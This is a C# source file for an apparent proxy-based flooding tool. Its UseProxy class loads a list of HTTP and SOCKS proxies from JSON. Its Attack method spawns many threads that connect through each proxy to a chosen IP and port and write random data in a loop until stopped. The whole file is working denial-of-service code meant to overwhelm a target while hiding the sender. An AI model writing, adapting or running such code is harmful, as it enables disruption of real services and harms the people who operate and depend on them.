using Newtonsoft.Json;
using ProxyFinder.Enums;
using Starksoft.Aspen.Proxy;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace ProxyFinder.Core
{
    public class UseProxy
    {
        private List<Proxy> _proxies = new List<Proxy>();

        private bool _isEnabled = false;

        public void LoadProxies(string path)
        {
            string json = File.ReadAllText(path);

            _proxies = JsonConvert.DeserializeObject<List<Proxy>>(json);
        }

        public void Stop()
        {
            _isEnabled = false;
        }

        public void Attack(string destIp, int destPort, int intervalms = 20, int simuntaniouslyProxies = 15, int shitAmmount = 10240)
        {
            _isEnabled = true;
            for (int x = 0; x < simuntaniouslyProxies; x++)
            {
                for (int i = 0; i < _proxies.Count; i++)
                {
                    Proxy proxy = _proxies[i];
                    new Thread(() =>
                    {
                        Socks5ProxyClient socks5ProxyClient;
                        Socks4ProxyClient socks4ProxyClient;
                        HttpProxyClient httpProxyClient;

                        TcpClient client;
                        NetworkStream stream;
                        byte[] buffer = new byte[shitAmmount];
                        while (_isEnabled)
                        {
                            try
                            {
                                switch (proxy.ProxyType)
                                {
                                    case Proxies.Http:
                                        httpProxyClient = new HttpProxyClient(proxy.IP, proxy.Port);

                                        client = httpProxyClient.CreateConnection(destIp, destPort);
                                        stream = client.GetStream();
                                        new Random().NextBytes(buffer);
                                        stream.Write(buffer);
                                        break;
                                    case Proxies.Socks5:
                                        socks5ProxyClient = new Socks5ProxyClient(proxy.IP, proxy.Port);

                                        client = socks5ProxyClient.CreateConnection(destIp, destPort);
                                        stream = client.GetStream();
                                        new Random().NextBytes(buffer);
                                        stream.Write(buffer);
                                        break;
                                    case Proxies.Socks4:
                                        socks4ProxyClient = new Socks4ProxyClient(proxy.IP, proxy.Port);

                                        client = socks4ProxyClient.CreateConnection(destIp, destPort);
                                        stream = client.GetStream();
                                        new Random().NextBytes(buffer);
                                        stream.Write(buffer);
                                        break;
                                }
                            }
                            catch { }

                            Thread.Sleep(intervalms);
                        }

                        Thread.CurrentThread.Interrupt();
                    }).Start();
                }

                Console.WriteLine("Done " + x);
            }
        }
    }
}
